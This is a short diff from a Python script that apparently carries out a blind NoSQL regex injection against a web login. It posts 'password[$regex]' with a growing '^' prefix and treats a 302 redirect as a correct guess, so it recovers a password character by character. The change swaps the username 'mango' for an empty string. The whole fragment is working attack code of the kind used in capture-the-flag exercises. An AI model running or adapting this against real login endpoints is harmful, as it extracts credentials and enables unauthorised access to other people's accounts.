@@ -22,7 +22,7 @@ while restart:
 
         payload = flag + i
 
-	post_data = {'username': 'mango', 'password[$regex]':"^"+ payload,'login':'login'}
+	post_data = {'username': '', 'password[$regex]':"^"+ payload,'login':'login'}
         r = requests.post(url, data=post_data, allow_redirects=False)
 
         # A correct password means we get a 302 redirect
